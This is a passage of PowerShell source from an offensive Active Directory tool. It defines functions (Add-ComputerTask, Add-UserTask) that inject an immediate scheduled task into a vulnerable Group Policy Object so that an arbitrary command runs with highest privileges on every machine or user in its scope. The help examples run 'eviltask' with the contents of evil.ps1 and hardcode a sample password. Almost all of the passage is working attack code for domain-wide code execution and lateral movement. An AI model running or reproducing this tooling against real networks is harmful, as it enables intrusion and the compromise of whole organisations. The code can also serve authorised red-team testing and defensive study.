        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true} 
        Update-GPOVersion @arguments
        Write-Host -ForegroundColor green "[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle."
    }

    END {

        Write-Verbose "Removing drive $share."
        Remove-PSDRive -Name $share
    }
}

function Add-ComputerTask {

<#

    .SYNOPSIS

        Add a new computer immediate task.

    .PARAMETER TaskName

        Set the name of the new task.

    .PARAMETER Author

        Set the author of the new task (use a DA account).

    .PARAMETER Command

        Command to execute.

    .PARAMETER CommandArguments

        Arguments passed to the command.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .PARAMETER Force

        Overwrite existing files if required.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Domain 'contoso.com'

    .EXAMPLE

        Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator

#>

    [CmdletBinding()]
    
    param (

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $TaskName,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $Author,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $Command,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $CommandArguments,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $GPOIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Switch]
        $Force,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        if ($PSBoundParameters['Credential']) {
            if (-not(($Credential.UserName).Contains('\'))) {

                $Credential = New-Object System.Management.Automation.PSCredential(-join @($env:USERDOMAIN,"\", $Credential.UserName), $Credential.GetNetworkCredential().SecurePassword)
            }
        }
        $commonArgs = @{}
        if ($PSBoundParameters['Credential']) {$commonArgs['Credential'] = $Credential}
        if ($VerbosePreference -eq "Continue") {$commonArgs['Verbose'] = $true}
        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Credential}
        if ($PSBoundParameters['DomainController']) {$arguments['DomainController'] = $DomainController}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $arguments['GPOIdentity'] = $GPOIdentity
        $TempGPOGuid = Get-GPOPath @arguments
        $GPOPath = $TempGPOGuid[1]
        $LDAPPath = $TempGPOGuid[2]
        Remove-Variable -Name 'TempGPOGuid'
    }

    PROCESS {

        $start = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">'
        $end = '</ScheduledTasks>'
        $ImmediateXmlTask = "<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>" -f $Author, $TaskName, $Command, $CommandArguments, ([System.String]([System.Guid]::NewGuid().Guid))
        $share = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})
        if ($env:LOGONSERVER) {

            $GPOPath = -join @($env:LOGONSERVER, ".", $GPOPath.SubString(2))
        } else {

            if ($PSBoundParameters['DomainController']) {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $arguments['Identity'] = $DomainController
                $DC = Get-DomainController @arguments
            } else {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $DC = Get-DomainController @arguments
            }
            $secondBackslash = $GPOPath.SubString(2).IndexOf('\')
            $GPOPath = -join @("\\$DC", $GPOPath.SubString(2).SubString($secondBackslash))
        }
        $null = New-PSDrive -PSProvider FileSystem -Name $share -Root $GPOPath @commonArgs
        $GPOPath = -join @($share, ":")
        $GPT_path = -join @($GPOPath, '\GPT.ini')

            if (Test-Path -Path $GPOPath) {

                $path = -join @($GPOPath,'\Machine\Preferences\ScheduledTasks\')
            } else {

                Write-Host -ForegroundColor Red -BackgroundColor black "[!] Could not find the specified GPO!"
                return
            }
    
            if (-not (Test-Path -Path $path)) {
    
                $null = New-Item -ItemType Directory -Path $path
            } 
    
            $path = -join @($path,'ScheduledTasks.xml')
            if (Test-Path -Path $path) {
    
                if ($Force) {
    
                    Write-Host -ForegroundColor Green "[+] Modifying $path"
                    $content = Get-Content -Path $path
                    $new_list = @()
                    foreach ($line in $content) {
                        
                        if (($line -replace " ", "").Contains("</ScheduledTasks>")) {
    
                            $new_list.Add(-join @($ImmediateXmlTask, $line))
                        }
                        $new_list.Add($line)
                    }
                    Set-Content -Path $path -Value ($new_list | Out-String) 
    
                    $arguments = @{}
                    if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                    $arguments['LDAPPath'] = $LDAPPath
                    $arguments['ObjectType'] = 'Computer'
                    $arguments['Path'] = $GPT_path
                    $arguments['GPOIdentity'] = $GPOIdentity
                    $arguments['Function'] = 'NewImmediateTask'
                    if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                    Update-GPOVersion @arguments
                } else {
    
                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] The GPO already includes a ScheduledTasks.xml. Use -Force to append to ScheduledTasks.xml or choose another GPO."
                }
            } else {
    
                Write-Host -ForegroundColor Green "[+] Creating file $path"
                $null = New-Item -Path $path -ItemType File
                $content = @"
$start
$ImmediateXmlTask
$end
"@
                Set-Content -Path $path -Value $content
                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                $arguments['LDAPPath'] = $LDAPPath
                $arguments['ObjectType'] = 'Computer'
                $arguments['Path'] = $GPT_path
                $arguments['GPOIdentity'] = $GPOIdentity
                $arguments['Function'] = 'NewImmediateTask'
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                Update-GPOVersion @arguments
            } 
        Write-Host -ForegroundColor green "[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle."
    }

    END {

        Write-Verbose "Removing drive $share."
        Remove-PSDRive -Name $share
    }
}
function Add-UserTask {

<#

    .SYNOPSIS

        Add a new user immediate task.

    .PARAMETER TaskName

        Set the name of the user new task.

    .PARAMETER Author

        Set the author of the new task (use a DA account).

    .PARAMETER Command

        Command to execute.

    .PARAMETER Arguments

        Arguments passed to the command.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .PARAMETER Force

        Overwrite existing files if required.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-UserTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-UserTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Domain 'contoso.com'

    .EXAMPLE

        Add-UserTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator

#>

    [CmdletBinding()]
    
    param (

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $TaskName,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $Author,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $Command,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $CommandArguments,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $GPOIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Switch]
        $Force,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        if ($PSBoundParameters['Credential']) {
            if (-not(($Credential.UserName).Contains('\'))) {

                $Credential = New-Object System.Management.Automation.PSCredential(-join @($env:USERDOMAIN,"\", $Credential.UserName), $Credential.GetNetworkCredential().SecurePassword)
            }
        }
        $commonArgs = @{}
        if ($PSBoundParameters['Credential']) {$commonArgs['Credential'] = $Credential}
        if ($VerbosePreference -eq "Continue") {$commonArgs['Verbose'] = $true}
        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Credential}
        if ($PSBoundParameters['DomainController']) {$arguments['DomainController'] = $DomainController}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $arguments['GPOIdentity'] = $GPOIdentity
        $TempGPOGuid = Get-GPOPath @arguments
        $GPOPath = $TempGPOGuid[1]
        $LDAPPath = $TempGPOGuid[2]
        Remove-Variable -Name 'TempGPOGuid'
    }

    PROCESS {

        $start = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">'
        $end = '</ScheduledTasks>'
        $ImmediateXmlTask = "<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>" -f $Author, $TaskName, $Command, $CommandArguments, ([System.String]([System.Guid]::NewGuid().Guid))
        $share = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})
        if ($env:LOGONSERVER) {

            $GPOPath = -join @($env:LOGONSERVER, ".", $GPOPath.SubString(2))
        } else {

            if ($PSBoundParameters['DomainController']) {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $arguments['Identity'] = $DomainController
                $DC = Get-DomainController @arguments
            } else {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $DC = Get-DomainController @arguments
            }
            $secondBackslash = $GPOPath.SubString(2).IndexOf('\')
            $GPOPath = -join @("\\$DC", $GPOPath.SubString(2).SubString($secondBackslash))
        }
        $null = New-PSDrive -PSProvider FileSystem -Name $share -Root $GPOPath @commonArgs
        $GPOPath = -join @($share, ":")
        $GPT_path = -join @($GPOPath, '\GPT.ini')

            if (Test-Path -Path $GPOPath) {

                $path = -join @($GPOPath,'\User\Preferences\ScheduledTasks\')
            } else {

                Write-Host -ForegroundColor Red -BackgroundColor black "[!] Could not find the specified GPO!"
                return
            }
    
            if (-not (Test-Path -Path $path)) {
    
                $null = New-Item -ItemType Directory -Path $path
            } 
    
            $path = -join @($path,'ScheduledTasks.xml')
            if (Test-Path -Path $path) {
    
                if ($Force) {
    
                    Write-Host -ForegroundColor Green "[+] Modifying $path"
                    $content = Get-Content -Path $path
                    $new_list = @()
                    foreach ($line in $content) {
                        
                        if (($line -replace " ", "").Contains("</ScheduledTasks>")) {
    
                            $new_list.Add(-join @($ImmediateXmlTask, $line))
                        }
                        $new_list.Add($line)
                    }
                    Set-Content -Path $path -Value ($new_list | Out-String) 
    
                    $arguments = @{}
                    if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                    $arguments['LDAPPath'] = $LDAPPath
                    $arguments['ObjectType'] = 'User'
                    $arguments['Path'] = $GPT_path
                    $arguments['GPOIdentity'] = $GPOIdentity
                    $arguments['Function'] = 'NewImmediateTask'
                    if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                    Update-GPOVersion @arguments
                } else {
    
                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] The GPO already includes a ScheduledTasks.xml. Use -Force to append to ScheduledTasks.xml or choose another GPO."
                }
            } else {
    
                Write-Host -ForegroundColor Green "[+] Creating file $path"
                $null = New-Item -Path $path -ItemType File
                $content = @"
$start
$ImmediateXmlTask
$end
"@
                Set-Content -Path $path -Value $content
                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                $arguments['LDAPPath'] = $LDAPPath
                $arguments['ObjectType'] = 'User'
                $arguments['Path'] = $GPT_path
                $arguments['GPOIdentity'] = $GPOIdentity
                $arguments['Function'] = 'NewImmediateTask'
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                Update-GPOVersion @arguments
            } 
        Write-Host -ForegroundColor green "[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle."
    }

    END {

        Write-Verbose "Removing drive $share."
        Remove-PSDRive -Name $share
    }
}
